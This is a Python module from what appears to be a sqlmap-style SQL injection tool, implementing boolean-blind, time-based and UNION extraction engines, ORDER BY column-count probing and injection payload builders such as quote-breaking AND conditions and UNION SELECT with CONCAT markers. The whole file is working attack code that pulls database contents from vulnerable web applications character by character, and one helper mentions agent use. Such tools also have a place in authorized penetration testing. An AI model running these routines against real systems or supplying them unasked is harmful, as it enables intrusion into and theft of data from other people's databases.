"""
Data extraction engines — boolean-blind, time-blind, error-based, union.
Real binary-search character extraction (sqlmap algorithm).
"""

from __future__ import annotations

from typing import Any, Awaitable, Callable

from .detect import analyze_pair, confirm_boolean
from .queries import get_query

# Request sender: async (req_dict) -> response dict
SendFn = Callable[[dict[str, Any]], Awaitable[dict[str, Any]]]


def _wrap_boolean_condition(dbms: str, condition: str, quote: str = "'") -> str:
    """Turn SQL condition into injectable AND suffix."""
    if quote == "'":
        return f"' AND ({condition})-- "
    if quote == '"':
        return f'" AND ({condition})-- '
    return f" AND ({condition})-- "


def _wrap_time_condition(dbms: str, condition: str, sleep: int = 3, quote: str = "'") -> str:
    q = get_query(dbms, "time_if", query=condition, sleep=sleep)
    expr = q["sql"]
    if quote == "'":
        return f"' AND {expr}-- "
    return f" AND {expr}-- "


async def extract_length_boolean(
    send: SendFn,
    build_with_payload: Callable[[str], dict[str, Any]],
    baseline: dict[str, Any],
    dbms: str,
    subquery: str,
    max_len: int = 64,
    quote: str = "'",
) -> dict[str, Any]:
    """Binary search string length via boolean blind."""
    lo, hi = 0, max_len
    requests = 0
    while lo < hi:
        mid = (lo + hi) // 2
        cond = get_query(dbms, "bool_gt_len", query=subquery, **{"len": mid})["sql"]
        payload = _wrap_boolean_condition(dbms, cond, quote=quote)
        resp = await send(build_with_payload(payload))
        requests += 1
        analysis = analyze_pair(baseline, resp, technique_hint="B")
        # if true (length > mid), response should differ from false pattern
        # We treat "injectable-looking difference" as TRUE for the condition
        # Better: compare mid vs mid+1 with dedicated true condition LENGTH=n
        is_true = analysis["similarity"] < 0.92 or analysis["baseline"]["status"] != analysis["test"]["status"]
        # Actually for AND (length>mid): if condition TRUE, page like baseline (for AND true)
        # sqlmap: true condition → original page; false → different
        # So TRUE means high similarity to baseline
        is_true = analysis["similarity"] >= 0.92 and analysis["baseline"]["status"] == analysis["test"]["status"]
        if is_true:
            lo = mid + 1
        else:
            hi = mid
    # verify exact
    cond = get_query(dbms, "bool_len", query=subquery, **{"len": lo})["sql"]
    payload = _wrap_boolean_condition(dbms, cond, quote=quote)
    resp = await send(build_with_payload(payload))
    requests += 1
    ver = analyze_pair(baseline, resp, technique_hint="B")
    ok = ver["similarity"] >= 0.92
    return {"length": lo if ok else lo, "verified": ok, "requests": requests, "subquery": subquery}


async def extract_string_boolean(
    send: SendFn,
    build_with_payload: Callable[[str], dict[str, Any]],
    baseline: dict[str, Any],
    dbms: str,
    subquery: str,
    length: int | None = None,
    max_len: int = 48,
    charset_max: int = 126,
    quote: str = "'",
) -> dict[str, Any]:
    """
    Extract string via boolean blind binary search per character (ORD/ASCII).
    True condition → page matches baseline (AND true keeps rows).
    """
    reqs = 0
    if length is None:
        lr = await extract_length_boolean(
            send, build_with_payload, baseline, dbms, subquery, max_len=max_len, quote=quote
        )
        length = int(lr["length"])
        reqs += lr["requests"]
    length = max(0, min(int(length), max_len))

    chars: list[str] = []
    for pos in range(1, length + 1):
        lo, hi = 32, charset_max  # printable ASCII
        while lo < hi:
            mid = (lo + hi) // 2
            cond = get_query(dbms, "bool_gt_char", query=subquery, pos=pos, char=mid)["sql"]
            payload = _wrap_boolean_condition(dbms, cond, quote=quote)
            resp = await send(build_with_payload(payload))
            reqs += 1
            analysis = analyze_pair(baseline, resp, technique_hint="B")
            is_true = analysis["similarity"] >= 0.92 and analysis["baseline"]["status"] == analysis["test"]["status"]
            if is_true:
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo) if 32 <= lo <= 126 else "?")

    return {
        "value": "".join(chars),
        "length": length,
        "requests": reqs,
        "subquery": subquery,
        "technique": "B",
        "dbms": dbms,
    }


async def extract_string_time(
    send: SendFn,
    build_with_payload: Callable[[str], dict[str, Any]],
    baseline: dict[str, Any],
    dbms: str,
    subquery: str,
    length: int = 8,
    sleep: int = 2,
    quote: str = "'",
) -> dict[str, Any]:
    """Time-based binary search extraction (slower, used when boolean unavailable)."""
    reqs = 0
    length = max(1, min(int(length), 32))
    chars: list[str] = []
    threshold = sleep * 1000 * 0.7 + float(baseline.get("elapsed_ms") or 0)

    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = get_query(dbms, "bool_gt_char", query=subquery, pos=pos, char=mid)["sql"]
            payload = _wrap_time_condition(dbms, cond, sleep=sleep, quote=quote)
            resp = await send(build_with_payload(payload))
            reqs += 1
            delayed = float(resp.get("elapsed_ms") or 0) >= threshold
            if delayed:
                lo = mid + 1
            else:
                hi = mid
        chars.append(chr(lo) if 32 <= lo <= 126 else "?")

    return {
        "value": "".join(chars),
        "length": length,
        "requests": reqs,
        "subquery": subquery,
        "technique": "T",
        "dbms": dbms,
        "sleep": sleep,
    }


def build_union_payload(
    columns: int,
    string_col: int,
    expression: str,
    quote: str = "'",
    trailing: str = "-- ",
    marker_left: str = "qjjq",
    marker_right: str = "qvjk",
    null_token: str = "NULL",
) -> str:
    """Build UNION SELECT with expression in string-capable column position (1-based)."""
    cols = []
    for i in range(1, columns + 1):
        if i == string_col:
            cols.append(f"CONCAT('{marker_left}',{expression},'{marker_right}')")
        else:
            cols.append(str(null_token or "NULL"))
    core = ",".join(cols)
    if quote == "'":
        return f"{quote} UNION SELECT {core}{trailing}"
    return f" UNION SELECT {core}{trailing}"


def parse_union_markers(body: str, marker_left: str = "qjjq", marker_right: str = "qvjk", max_chars: int = 500) -> str | None:
    return re_search_markers(body, marker_left=marker_left, marker_right=marker_right, max_chars=max_chars)


def re_search_markers(body: str, marker_left: str = "qjjq", marker_right: str = "qvjk", max_chars: int = 500) -> str | None:
    import re

    left = re.escape(str(marker_left or "qjjq"))
    right = re.escape(str(marker_right or "qvjk"))
    m = re.search(left + r"(.*?)" + right, body or "", re.S)
    if m:
        return m.group(1)[:max(0, min(int(max_chars or 500), 5000))]
    m = re.search(r"~([^~]{0,5000})~", body or "")
    if m:
        return m.group(1)[:max(0, min(int(max_chars or 500), 5000))]
    return None


def extraction_plan(dbms: str = "MySQL", subquery: str = "SELECT VERSION()", techniques: str = "BETU", max_len: int = 32, max_requests: int = 500) -> dict[str, Any]:
    """Return a bounded, non-executing SQLMap extraction plan for Files/agent use."""
    selected = "".join(c for c in str(techniques or "BETU").upper() if c in "BETU") or "B"
    length = max(1, min(int(max_len or 32), 128))
    budget = max(1, min(int(max_requests or 500), 5000))
    steps = []
    if "B" in selected:
        steps.append({"technique": "B", "operation": "length_then_ascii_binary", "estimated_requests": min(budget, length * 8 + 8)})
    if "E" in selected:
        steps.append({"technique": "E", "operation": "error_marker_extract", "estimated_requests": 1})
    if "T" in selected:
        steps.append({"technique": "T", "operation": "timing_ascii_binary", "estimated_requests": min(budget, length * 8)})
    if "U" in selected:
        steps.append({"technique": "U", "operation": "union_marker_extract", "estimated_requests": 1})
    return {"dbms": dbms, "subquery": subquery, "techniques": selected, "max_len": length, "max_requests": budget, "steps": steps, "count": len(steps), "executed": False}


async def find_column_count(
    send: SendFn,
    build_with_payload: Callable[[str], dict[str, Any]],
    baseline: dict[str, Any],
    max_columns: int = 20,
    quote: str = "'",
) -> dict[str, Any]:
    """ORDER BY binary / linear probe for column count."""
    last_ok = 0
    results = []
    for n in range(1, max_columns + 1):
        payload = f"{quote} ORDER BY {n}-- " if quote else f" ORDER BY {n}-- "
        resp = await send(build_with_payload(payload))
        analysis = analyze_pair(baseline, resp, payload=payload, technique_hint="U")
        failed = analysis["test"]["status"] >= 500 or analysis["similarity"] < 0.75
        # also check signals
        for s in analysis["signals"]:
            if s.get("failed") is True:
                failed = True
            if s.get("failed") is False:
                failed = False
        results.append({"n": n, "failed": failed, "status": analysis["test"]["status"], "similarity": analysis["similarity"]})
        if failed:
            break
        last_ok = n
    return {
        "columns": last_ok,
        "probes": results,
        "method": "ORDER BY",
    }
